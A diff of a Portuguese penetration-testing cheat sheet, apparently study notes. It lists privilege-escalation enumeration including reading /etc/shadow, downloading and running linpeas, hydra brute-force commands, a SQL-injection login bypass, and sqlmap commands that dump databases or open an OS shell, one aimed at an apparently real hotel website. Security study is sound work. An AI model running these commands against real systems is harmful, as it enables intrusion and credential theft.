@@ -268,45 +268,66 @@ cat /etc/crontab
 ls -la /etc/cron*
 
 **Verificar arquivos graváveis**:
+
 find / -writable -type f -name "*.sh" 2>/dev/null
 
 **Explorar serviços com privilégios elevados**
+
 netstat -tuln
 
 **Verifique serviços de rede rodando**:
+
 netstat -tuln
+
 ss -nlpt
 
 Serviços vulneráveis, como o **NFS**, podem permitir montagem de diretórios como root:
+
 showmount -e localhost
 
 Verificar histórico de comandos
+
 cat ~/.bash_history
 
 **Verificar senhas armazenadas**
-cat /etc/passwd                             # Lista de usuários do sistema
-cat /etc/shadow                             # Arquivo de senhas (root necessário)
+
+Lista de usuários do sistema
+
+cat /etc/passwd
+
+Arquivo de senhas (root necessário)
+
+cat /etc/shadow
 
 
 Verificar programas de terceiros e pacotes instalados
-Listar pacotes instalados:
+**Listar pacotes instalados:**
 dpkg -l
+
 rpm -qa
 
-Verificar binários com privilégios elevados:
+**Verificar binários com privilégios elevados:**
+
 which nmap vim gcc perl python ruby find
 
-Procurar vulnerabilidades no Kernel
+**Procurar vulnerabilidades no Kernel**
+
 uname -r
 
 **Ferramentas de Enumeração Automáticas**
+
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+ 
 chmod +x linpeas.sh
+
 ./linpeas.sh
 
 **Linux Exploit Suggester**:
+
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+
 chmod +x linux-exploit-suggester.sh
+
 ./linux-exploit-suggester.sh
 
 
@@ -326,46 +347,63 @@ aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (Fo
 ## WEB HACKING
 
 ### CMS
+
 Wordpress, Joomla, Drupal
 
 **Droopescan**
+
 https://github.com/SamJoan/droopescan
+
 Comando: `droopescan scan drupal -u http://example.org/ -t 32`
+
 wpscan --url https://example/ --enumerate u
+
 wpscan --url https://example/ --passwords wordlist.txt --usernames samson
 
 
 **CMSmap**
+
 https://github.com/dionach/CMSmap
 
 cmsmap.py https://example.com
+
 cmsmap.py https://example.com -f W -F --noedb -d
+
 cmsmap.py https://example.com -i targets.txt -o output.txt
+
 cmsmap.py https://example.com -u admin -p passwords.txt
+
 cmsmap.py -k hashes.txt -w passwords.txt
 
 #### Wordpress
 https://academy.hackthebox.com/module/17/section/40
 
 #### Drupal
+
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal/drupal-rce
 
 #### Joomla
+
 https://github.com/OWASP/joomscan
 
 joomscan update
+
 joomscan check
+
 joomscan -u http://www.joomla.org
 
 ### Bruteforce
 
 **SSH**
+
 hydra ssh://127.0.0.1:22222 -L /home/wordlist.txt -P wordlist.txt -V
 
 **Form**
+
 `hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=inc`
 
 **SMB**
+
 hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
 
 ### SQLi
@@ -376,19 +414,29 @@ hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
 ```
 
 **Manual SQL Injection**
+
 `in login page enter blah' or 1=1-- as username and click login without entering the password`
 
 **GET access of OS Shell =**
+
 `sqlmap -u 'url' --dbms=mysql --os-shell SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell`
 
 sudo sqlmap --update
+
 sqlmap -u "------/id=1" --dbs --batch
+
 sqlmap -u "https://bliss-hotel.000webhostapp.com/room_details.php?room_type_id=RM101" --dbs --batch
+
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
+
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch
 
 sqlmap -u http://site/viewprofile.aspx?id=1 --cookie="teste=12wqad..." --bath --dbs
@@ -435,16 +483,22 @@ Descobrindo nfs data stream
 Comando: `dir /r`
 
 **Escondendo a informação**
+
 Comando: `echo "mensagem" > agenda.txt:stream1`
+
 Comando: `more < agenda.txt:stream1`
 
 **Extraindo a informação**
+
 Comando: `more < agenda.txt:stream1`
 
 ### Steghide
 **Inserindo uma mensagem secreta**
+
 Comando: `steghide embed -ef mensagemsecreta.txt -cf imagem.jpeg -sf imagemstegno.jpeg`
+
 **Extraindo a mensagem**
+
 Comando: `steghide extract -sf imagemstegno.jpeg -xf mensagemdescoberta.txt`
 
 **Stegcracker** - Steghide automatizado que utiliza uma Wordlist
@@ -453,20 +507,29 @@ https://github.com/Paradoxis/StegCracker
 **Stegseek** é mais rápido que o stegcracker https://github.com/RickdeJager/stegseek
 
 ### Snow
+
 **Criando a mensagem**
+
 Comando: `snow.exe -C -p magic -m "Mensagem a ser ocultada" averdade2.txt`
+
 **Extraindo a mensagem**
+
 Comando: `snow.exe -C -p magic arquivo.txt`
 
 ### Hashes
+
 **Tirando hash pelo PowerShell**
+
 Comando: `certutil -hashfile arquivo.txt`
 
 **Gerando hash com Get-FileHash**
+
 Comando: `Get-FileHash <Location> -A SHA256 (SHA-1/256/384/512/MD5)`
 
 **Verificando se um arquivo possui determinada hash e realiza a comparação**
+
  - Retornará verdadeiro ou falso
+ 
 Comando: `(Get-FileHash <Location> -A SHA256 ).hash -eq "<hash value>"`
 
 
